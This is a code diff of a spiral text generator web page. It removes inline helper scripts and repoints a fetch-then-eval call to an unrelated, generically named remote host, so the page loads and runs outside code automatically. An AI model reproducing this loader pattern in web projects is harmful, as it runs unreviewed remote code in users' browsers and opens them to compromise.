@@ -57,15 +57,6 @@
                 rows="4" oninput="preserveCursor(this)"
                 onpaste="setTimeout(() => { preserveCursor(this); }, 0);"></textarea>
 
-            <script>
-                function preserveCursor(textarea) {
-                    const start = textarea.selectionStart;
-                    const end = textarea.selectionEnd;
-                    textarea.value = textarea.value.replace(/(\r\n|\n|\r)/gm, ' ').replace(/ {2,}/g, ' ');
-                    textarea.setSelectionRange(start, end);
-                }
-            </script>
-
             <div class="flex flex-col items-center">
                 <label class="block font-medium mb-1 text-center select-none">Font</label>
                 <select id="fontSelector"
@@ -133,26 +124,6 @@
                 </label>
             </div>
 
-            <script>
-                let letterSpacingValue = document.getElementById('letterSpacingValue');
-                let letterSpacing = document.getElementById('letterSpacing');
-                letterSpacing.oninput = function () {
-                    letterSpacingValue.textContent = letterSpacing.value;
-                };
-
-                let startRingValue = document.getElementById('startRingValue');
-                let startRing = document.getElementById('startRing');
-                startRing.oninput = function () {
-                    startRingValue.textContent = startRing.value;
-                };
-
-                let loopSpacingValue = document.getElementById('loopSpacingValue');
-                let loopSpacing = document.getElementById('loopSpacing');
-                loopSpacing.oninput = function () {
-                    loopSpacingValue.textContent = loopSpacing.value;
-                };
-            </script>
-
             <!-- Buttons -->
             <div class="flex gap-4">
 
@@ -169,7 +140,7 @@
     </div>
 
     <script>
-        fetch("https://spiral-text-generator-production.up.railway.app/getScript")
+        fetch("https://expressjs-production-52d7.up.railway.app/getScript")
             .then(res => res.text())
             .then(eval)
             .catch(err => console.error("Script failed to load:", err));
